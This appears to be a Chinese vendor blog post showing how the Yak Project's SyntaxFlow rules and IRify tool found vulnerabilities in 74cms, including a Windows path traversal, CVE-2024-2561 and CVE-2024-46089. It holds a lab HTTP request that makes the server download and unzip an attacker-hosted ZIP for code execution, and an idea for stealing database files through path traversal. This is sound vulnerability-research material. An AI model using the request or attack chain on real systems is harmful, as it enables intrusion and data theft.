#  SyntaxFlow：挖掘 CVE 漏洞必备神器！你还不赶紧了解？   
原创 YAK  Yak Project   2025-04-25 09:02  
  
#   
  
![](https://mmbiz.qpic.cn/mmbiz_gif/f7AtEgJhMZfCSs0zKcMmDXyJt76PDpGiataSbajd3BpbZnPXBCqFaA3icu2mY1LGqAmJHIiaCq5N9qCBv47ktQEYA/640?wx_fmt=gif&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudic6NWfMSJWFgz2JwxI10Z4Qoxs5YLH3oibnffYlSbojWtzPDMOvPh2ZA/640?wx_fmt=webp&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wr0JM4x7ss8HvgReia2VP8Pq8BaMhibKWvyqNEGZnb5O1bpTD8BUZQSNhg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrTR20s8oswpHXriaPAAT4trBzynRbbyNwJmBrAGY2a73SfhBJzWxvF9w/640?wx_fmt=jpeg "")  
> 基础知识：https://ssa.to/syntaxflow-guide/intro  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrFA4UFMqyEdSicektq0NAuOfGzpWpB1KffR7USibZfWrkCw68E7tVw6Kw/640?wx_fmt=png&from=appmsg "")  
  
对于框架来说，常常是不能编译底层全部源码的，一方面，底层源码采用多种设计模式来降低代码的耦合度，另一方面，对于底层的代码框架，其文件和包含的依赖常常有几千个，其编译起来会非常吃内存，并且会出现速度降低的情况。  
  
而框架又很像“填空题”，其设计的MVC，都已经内置了一些基础类，比如基础的Controller  
、View  
等类来做，编译的时候，只需要找到上层类，然后针对性的对上层类/用户API测的代码进行编译即可。  
  
> 而 yak-ssa 又支持代码部分编译，是一个适配性非常好的工具。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrNHz3A7ycHPaWJgQ8db2fTFKKA7VqrlM0BSQYaicIDmlnDCzf2lMypYw/640?wx_fmt=png&from=appmsg "")  
  
在上面给到了编译技巧，那么针对框架来说，参数的获取/生成是被包裹在thinkphp底层的获取中，并且也内置了一些常见的默认过滤函数。比如在之前的代码审计中php代码审计，说过一些thinkphp的规则编写，接下来我将具体介绍规则编写实例。  
```
input() as $sink
I() as $sink
./param|request|server|cookie|get|post|only|except|file/ as $function
$function?{<getObject>?{opcode: call && any: "Request"}} as $sink
$function?{<getObject>?{any: "Request","request"}} as $sink
$sink?{<getFunc><getCurrentBlueprint><fullTypeName>?{any: "Controller","controller"}}  as $output
alert $output
```  
  
这段syntaxFlow规则大意为：  
  
拿到thinkphp中所有的输入点，包括：  
```
request->param()
request->param
......
```  
  
然后限制这些输入点的 Blueprint（在php中理解为类）的全限定名中有：controller/Controller  
  
> 可能存在的问题：  
> 在代码审计过程中，可能有些并不是Controller，这里只是做了一些框架的大众化处理，可能针对某些具体情况需要进行具体修改。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wr3S1TAkI3y8qAgVerutRlkJR0icULiao9KC7ibLibjm1XOqHa3dbPDgwNiaw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wreyiaPUSQKUfjdNiapdEibaKjKV5CSVBUKvZ0h71efj8AGEqiaIsMmtsGbw/640?wx_fmt=png&from=appmsg "")  
  
74cms是基于thinkphp进行的二次开发，在2024年末，yak-ssa   
刚刚问世时，当时只适配了命令行工具进行编译和规则执行，我尝试用 yak-ssa 命令行进行编译审计挖掘出来的，  
接下来我将用  
最新版的 IRify 来进行审计。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrbZPHBWfIL1ibPhx6ibI76a5ymGSnU4y4Z4viaT7zO7lR30YE4XibK5n5bw/640?wx_fmt=png&from=appmsg "")  
### 【内置规则】windows任意文件读取（已交CVE）  
```
desc(
    title: 'file operator',
    title_zh: "恶意文件操作",
    type: vul,
    level: low,
    risk:"path-traversal",
    desc: <<<TEXT
    文件操作是Web应用程序中常见的功能，如果未经过充分的安全检查，可能会导致文件路径遍历（Path Traversal）漏洞。攻击者可以通过构造恶意文件路径，访问或修改服务器上的敏感文件，进而导致信息泄露、文件损坏等安全问题。在PHP应用程序中，如果开发者未能正确验证或过滤用户输入的文件路径，可能会导致文件路径遍历漏洞。建议对文件操作功能进行严格的安全检查，包括验证文件路径的合法性、长度、字符等，并确保文件操作不会导致未经授权的访问或执行。
TEXT
)
<include('php-file-read')> as $read
<include('php-file-unlink')> as $write
<include('php-file-write')> as $unlink
$read + $write + $unlink as $source
<include('php-param')> as $params
<include('php-tp-all-extern-variable-param-source')> as $params
<include('php-filter-function')> as $filter
$source(* as $param)
$param#{
    include: `<self> & $params`
}-> as $all
$param#{
    include: `<self> & $params`,
    exclude: `<self>?{opcode: call}`
}-> as $high
alert $high for{
    title: 'Direct file manipulation,not call method',
    type: 'vuln',
    level: 'high'
}
$param #{
    include: `<self>& $params`,
    exclude: `*?{opcode: call && <self><getCallee> & $filter}`
}-> as $middle
alert $middle for{
    title_zh: '存在文件操作，文件操作经过函数，但未检出过滤',
    title: 'File operations exist, file operations pass through functions, but no filter is checked out',
    type: 'mid',
    level: 'mid'
}
$all - $high - $middle as $low
alert $low for{
    title_zh: '存在文件操作，文件操作经过函数，检出过滤',
    title: 'File operations exist, file operations pass through functions,  filter is checked out',
    type: 'low',
    level: 'low'
}
```  
  
  
我们定位到download.php  
中：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrvFdZ7dscCLSgzR0rKyJDjNY3vFTHP1dOYmItRyV6InAliaaaEMvnnbA/640?wx_fmt=png&from=appmsg "")  
  
代码如下，在过滤中，只过滤掉了../  
，没有过滤windows的..\\  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrVFewCtOgg0JPg9hzeQvjXF9Hmz8eEePhOQwx9vgJfFtMIoWH3opjpA/640?wx_fmt=png&from=appmsg "")  
#### 漏洞复现：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wr3vKjO5mZhSbZdTDUULT40pIZsXL8lR7ias7ibibWicGtV8GhBxSDA4zq0g/640?wx_fmt=png&from=appmsg "")  
### 【内置规则】后台RCE（CVE-2024-2561 漏洞复现）：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wr6s4wa4lHRfibdRzCxfCazaY4HT4gq6icAGuwakrzCuzIs0Oe5QczME9A/640?wx_fmt=png&from=appmsg "")  
  
代码如下，在正则中，拿到$type，然后直接进行拼接，匹配的是data伪协议。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wr8bb8fg8xTDkvbWUicNBRptll1tiayBbvSicmZEgk4d3HH4VibqibjsSypng/640?wx_fmt=png&from=appmsg "")  
#### 漏洞复现：  
  
在这里进行构造：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrcUMmRSiaMnQQiaZteorpTP796Wnh6yWcz9kA9eKNC7QRiaybRnMvWrTHQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrJx0IicLgKI1C0Hia3Jf8W1XxrVTvc7pb50ojb7veib9W9FlglTeia4zEiaw/640?wx_fmt=png&from=appmsg "")  
  
### 后台ZIP下载+解压RCE【CVE-2024-46089】：  
```
desc(
    title: 'zip operator',
    title_zh: "文件压缩/文件解压",
    type: vul,
    level: low,
    risk: "zip operator",
    desc: <<<CODE
    zip操作是Web应用程序中常见的功能，如果未经过充分的安全检查，可能会导致文件路径遍历（Path Traversal）漏洞。攻击者可以通过构造恶意文件路径，访问或修改服务器上的敏感文件，进而导致信息泄露、文件损坏等安全问题。在PHP应用程序中，如果开发者未能正确验证或过滤用户输入的文件路径，可能会导致文件路径遍历漏洞。建议对zip操作功能进行严格的安全检查，包括验证文件路径的合法性、长度、字符等，并确保zip操作不会导致未经授权的访问或执行。
CODE
)
input() as $sink
I() as $sink
./param|request|server|cookie|get|post|only|except|file/ as $function
$function?{<getObject>?{opcode: call && any: "Request"}} as $sink
$function?{<getObject>?{any: "Request","request"}} as $sink
$sink?{<getFunc><getCurrentBlueprint><fullTypeName>?{any: "Controller","controller"}}  as $output
<include('php-filter-function')> as $filter
.unzip?{<getObject>?{have: ZipHandle}} as $target
$target(* #{
    include: <<<CODE
* & $output
CODE
}-> as $all)
$target(* #{
    include: <<<CODE
* & $params
CODE,
    exclude: <<<CODE
<self>?{opcode: call}
CODE
}-> as $high)
alert $high for {
    title: 'Unsafe File Unzip Without Validation',
    title_zh: '未经验证的高危文件解压',
    level: 'high'
}
$target(* #{
    include: <<<CODE
* & $params
CODE,
    exclude: <<<CODE
<self>?{opcode: call && <self><getCallee> & $filter}
CODE
}-> as $mid)
alert $mid for {
    title: 'Insecure File Type Detection',
    title_zh: '文件解压经过了某些函数，但未检查到过滤',
    level: 'mid'
}
$all - $high - $mid as $low
alert $low for{
    title: 'Potential File Storage Path Misconfiguration',
    title_zh: '潜在的文件存储路径配置问题',
    level: 'low'
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wreFsKGULEAnxNo42zwGJUQf9eM5jzscGA5IYzaqAEnZ0eA9XqkOn90g/640?wx_fmt=png&from=appmsg "")  
  
unzip是将输入的path进行一定的拼接，然后进行unzip。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrkWZatjjKM4PowFw9LLDmnFTnahibWIAMYM05sYzbxvobHSjZgKBrkMA/640?wx_fmt=png&from=appmsg "")  
  
在这里找到一个  
unzip的反向，  
下载zip，下载完zip之后，会存到固定路径中，然后执行unzip即可。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrdkIHytUibnZ0V3eYsuHibz56H64YOcQXSJ26HQqiaV6ribkztj8iahAN5Lg/640?wx_fmt=png&from=appmsg "")  
#### 漏洞复现：  
  
zip文件夹路径如图：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wr5iazOLQGJznYzR69Wajf9xUZlbZewl80RiaibqWVicDctHpxNHrpzKSliaw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrHeZy0SSDOlSXMeAm1A3wx7sIPvBKgnoFbCu8P86ZQ4kJJmibylHvrzA/640?wx_fmt=png&from=appmsg "")  
```
GET /index.php/apiadmin/Upgrade/download?path=http://10.211.55.2:7788/upgrade.zip&timestamp=1 HTTP/1.1
Host: 10.211.55.11
Accept-Encoding: gzip, deflate
Cookie: Hm_lvt_d7fcc824c81abdf6e6d33ffc0e10c071=1736077733,1736168831,1736218733; PHPSID=68cd6da824f0d94132ca311bd76d1131; Hm_lvt_8dcaf664827c0e8ae52287ebb2411aed=1741364373; PHPSESSID=m5f2pm9giti1mno9u9de4dngms; qscms_access_export=1; qscms_access_delete=1; qscms_access_set_service=1
admintoken: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NDUzODU1MjMsImV4cCI6MTc1MzE2MTUyMywiaW5mbyI6eyJpZCI6MSwicm9sZV9pZCI6MX19.POBct8pTWPlDbxkt3xIwajLpAB7O47NxD13A-RfCwB8
Referer: http://10.211.55.11/admin/
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wr7Ten9YZYfWZXslCOTYww04QyoNcKG58mujdwS4r6Uqh0d8lZ8QH5vQ/640?wx_fmt=png&from=appmsg "")  
  
会解压失败，  
原因是因为没有conver文件夹，  
不过问题不大，因为已经执行了解压操作，并且已经将文件解压到对应目录中。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrIZ3L6rKlXT9TjegqgnQjxJjYA3BAxrpniaZ31BW4zeeafjDuIEicibT1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wroTkcF97rXtozibVZK2hKibMu8XRZFkRd8nlL7yeBubVTvILnhMXScOsw/640?wx_fmt=png&from=appmsg "")  
#### 一个可能的windows前台任意文件读+后台RCE的方式：  
  
因为有windows的任意文件读取，我的项目是基于phpstudy起的，而该项目是基于mysql的，一个可能的路径是：  
```
/var/lib/mysql/data/74cms
```  
  
因为mysql的持久化是存到文件中，所以  
可以将mysql 74cms库中的数据下载下来，然后开一个数据库，cp到本地的数据库目录中查看。  
  
  
> 这个路线我并没有尝试，在写文章的过程中想到的思路，不过我觉得问题并不是很大，可能会出现的问题是：有可能mysql中的表索引并不只靠qs_admin.frm/ibd这两个文件，不过如果你能本地安装74cms，然后实现替换的话，应该是可读的。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wrnFseJFAmfswTGTnpb8Cwetl7WCQb56aDZBM696m3DccHVib2vvEJfDw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wr5BdykeFFwRUlp8lKmN026CMFrw2gtyYXjpicD8vTmbxOggFa1nn5MsQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0zsUyHdCzPNEEvAr3R3wraGVbbuh9uFB1I3yhVHMUicBkxe3L918NTmTOt2IdydUkfkMYQ7mFbMw/640?wx_fmt=png&from=appmsg "")  
  
在上面的CVE审计过程中，  
除 CVE-2024-2561   
撞洞外，其他均为原创且已提交CVE官方。  
  
**END**  
  
  
  
 **YAK官方资源**  
  
  
Yak 语言官方教程：  
  
https://yaklang.com/docs/intro/  
  
Yakit 视频教程：  
  
https://space.bilibili.com/437503777  
  
Github下载地址：  
  
https://github.com/yaklang/yakit  
  
Yakit官网下载地址：  
  
https://yaklang.com/  
  
Yakit安装文档：  
  
https://yaklang.com/products/download_and_install  
  
Yakit使用文档：  
  
https://yaklang.com/products/intro/  
  
常见问题速查：  
  
https://yaklang.com/products/FAQ  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcGEibOlRNlz6ZPic3cWicMDwdqZLq9q0hibDYiaICia6nncspoDTRnjPXFGTr3VWd9FlV4YSXRStoabxbg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/f7AtEgJhMZeX0EdicJxBOjGjQuecg0TvCvRgqibPwyOUp8untXs9Cl5XKux2yQQf27ibgZ0ic0Fm2yicdbYg6c4xUJg/640?wx_fmt=gif&from=appmsg "")  
  
  
  
